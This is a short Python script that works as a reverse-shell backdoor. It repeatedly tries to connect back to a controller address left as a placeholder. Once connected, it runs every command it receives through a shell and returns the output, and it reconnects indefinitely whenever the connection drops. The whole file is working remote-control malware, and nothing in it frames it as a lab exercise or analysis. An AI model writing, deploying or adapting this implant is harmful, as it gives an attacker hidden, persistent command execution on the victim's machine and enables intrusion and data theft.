import socket
from subprocess import check_output
from cryptography.hazmat.primitives.asymmetric import rsa
from time import sleep

SELF = socket.gethostbyname(socket.gethostname())
PORT = 5051
BUFFER_SIZE = 1024
FORMAT = "utf-8"

HOST = "ENTER CONTROLLER IP ADDRESS HERE"

def main():
    while True:
        SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        SOCKET.bind((SELF, PORT))
        
        #standby mode (trying to connect to the controller until successful )
        successful = False
        while not successful:
            try:
                #replace with HOST after initial testing complete
                SOCKET.connect((SELF, 5050))
                print("connected")
                successful = True
            except:
                print("no response")
                sleep(5)
        
        #active mode (executing commands from the controller)
        while True:
            command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
            print(command)
            if command[0] == "HOST_DISCONNECT":
                SOCKET.close()
                break
            try:
                output = check_output(command, shell=True)
                if output == b'':
                    output = b' '
                SOCKET.send(output)
            except Exception as e:
                SOCKET.send(bytes(str(e), FORMAT))

while True:
    try:
        main()
    except:
        print("server disconnected")
